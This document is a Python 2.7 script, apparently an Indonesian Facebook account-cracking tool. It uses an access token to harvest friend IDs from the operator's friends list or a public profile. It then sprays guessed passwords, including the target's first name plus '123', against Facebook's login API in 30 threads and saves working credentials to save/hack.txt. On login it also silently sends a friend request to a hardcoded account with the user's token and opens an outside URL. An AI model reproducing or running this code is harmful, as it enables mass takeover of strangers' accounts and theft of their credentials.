#!/usr/bin/python2.7
import os,sys,time,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool

try:
	import requests
except ImportError:
	os.system('python -m pip install requests')

try:
	import mechanize
except ImportError:
	os.system('python -m pip install mechanize')



from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/222.0.0.15.124;]')]

def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def Mengetik(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.06)

logo = ''' 




          \033[0;92m{ GILANG SANJAYA XD. }\033[0;39m          \n'''

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print 'Sedang masuk ' + o,
        sys.stdout.flush()
        time.sleep(1)

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []

def login():
	print logo
	try:
		toket = open('login.txt','r')
		menu()
	except (KeyError, IOError):
		print 'Login with your account first!\n'
		id = raw_input('email : ')
		pwd = raw_input('password :')
		print 'Sedang Masuk...'
	try:
		br.open('https://mbasic.facebook.com/')
	except mechanize.URLError:
		print 'tidak ada koneksi!'
		os.sys.exit(0)

	br._factory.is_html = True
	br.select_form(nr=0)
	br.form['email'] = id
	br.form['pass'] = pwd
	br.submit()
	url = br.geturl()
	if 'save-device' in url:
		try:
			sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
			data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
			x = hashlib.new('md5')
			x.update(sig)
			a = x.hexdigest()
			data.update({'sig': a})
			url = 'https://api.facebook.com/restserver.php'
			r = requests.get(url, params=data)
			z = json.loads(r.text)
			unikers = open('login.txt', 'w')
			unikers.write(z['access_token'])
			unikers.close()
			print 'Login success!'
			requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
			os.system ('xdg-open https://www.nagato-official23.my.id')
			menu()
		except requests.exceptions.ConnectionError:
			print 'Tidak ada koneksi!'
			os.sys.exit(0)
	if 'checkpoint' in url:
		print 'sepertinya akun anda checkpoint / terkena sesi'
		os.system('rm -rf login.txt')
		os.sys.exit(0)
	else:
		print 'Email/password salah!'
		os.system('rm -rf login.txt')
		os.sys.exit(0)

def menu():
	global toket
	try:
		toket = open('login.txt','r').read()
	except IOError:
		print 'Sepertinya anda telah Logout!'
		os.system('rm -rf login.txt')
		os.sys.exit(0)
	os.system('clear')
	print logo
	print '  \033[0;92m|| Created By\033[0;39m :  Gw'
	print '  \033[0;92m|| Recode By\033[0;39m : Me'
	print '  \033[0;92m|| FB.me/\033[0;39m : Gilang Sanjaya XD.'
	print '-----------------------------------------------------'
	print '             \033[0;92m||1.|| \033[0;39m Crack From Friendslist'
	print '             \033[0;92m||2.|| \033[0;39m Crack From Public'
	print '             \033[0;92m||0.|| \033[0;39m Exit this program'
	wi()

def wi():
	global cekpoint
	global oks
	a1 = raw_input('choose :')
	if a1 =='1':
		os.system('clear')
		print logo
		print 25* '-'
		r = requests.get('https://graph.facebook.com/me/friends?access_token=' +toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['data'])

	elif a1 =='2':
		os.system('clear')
		print logo
		print '  \033[0;92m|| Created By\033[0;39m :  GILANG SANJAYA'
		print '  \033[0;92m|| Recode By\033[0;39m : Me'
		print '  \033[0;92m|| FB.me/\033[0;39m : Gilang Sanjaya XD.'
		print '\033[37;1m=========================================='
		idt = raw_input('\033[0;92m  || MASUKAN ID PUBLIC\033[0;39m :')
		try:
			jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
			op = json.loads(jok.text)
			print '{#} User :' + op['name']
		except KeyError:
			print 'id not found!'
			time.sleep(3)
			menu()

		r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])

	print 'id found : '+str(len(id))
	time.sleep(1)
	pw1 = raw_input ('\033[0;92mPassword :')
	pw2 = raw_input ('\033[0;92mPassword :')
	pw3 = raw_input ('\033[0;92mPassword :')
	print ('\033[37;1m==========================================\033[0;39m')
	

	def main(arg):
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass

		try:
			a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
			b = json.loads(a.text)
			p1 = pw1
			data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			q = json.load(data)
			if 'access_token' in q:
				print '[CP] '+ user +' | '+ p1
				cek = open('save/hack.txt','a')
				cek.write(user+'|'+p1+'\n')
				cek.close()
				oks.append(user+p1)
			elif 'www.facebook.com' in q['error_msg']:
				print '\033[0;92m -[OK]\033[0;39m '+ user +' | '+ p1
				print '\033[0;92m* ------------------------> ' + b['birthday']
				cekpoint.append(user+p1)

			else:
				p2 = pw2
				data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p2 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
				q = json.load(data)
				if 'access_token' in q:
					print '[CP] '+ user +' | '+ p2
					cek = open('save/hack.txt','a')
					cek.write(user+'|'+p2+'\n')
					cek.close()
					oks.append(user+p2)
				elif 'www.facebook.com' in q['error_msg']:
					print '\033[0;92m -[OK]\033[0;39m '+ user +' | '+ p2
					print '\033[0;92m* ------------------------> ' + b['birthday']
					cekpoint.append(user+p2)
					
				else:
					p3 = pw3
					data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p3 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
					q = json.load(data)
					if 'access_token' in q:
						print '[CP] '+ user +' | '+ p3
						cek = open('save/hack.txt','a')
						cek.write(user+'|'+p3+'\n')
						cek.close()
						oks.append(user+p3)
					elif 'www.facebook.com' in q['error_msg']:
						print '\033[0;92m -[OK]\033[0;39m '+ user +' | '+ p3
						print '\033[0;92m* ------------------------> ' + b['birthday']
						cekpoint.append(user+p3)

					else:
						p4 = b['first_name'] + '123'
						data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p4 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
						q = json.load(data)
						if 'access_token' in q:
							print '[CP] '+ user +' | '+ p4
							cek = open('save/hack.txt','a')
							cek.write(user+'|'+p4+'\n')
							cek.close()
							oks.append(user+p4)
						elif 'www.facebook.com' in q['error_msg']:
							print '\033[0;92m -[OK]\033[0;39m '+ user +' | '+ p4
							print '\033[0;92m* ------------------------> ' + b['birthday']
							cekpoint.append(user+p4)

		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print 25* '-'
	print ' NGOCOK DONE !'
	print 25* '-'
	os.sys.exit(0)

if __name__ == '__main__':
	login()
	menu()
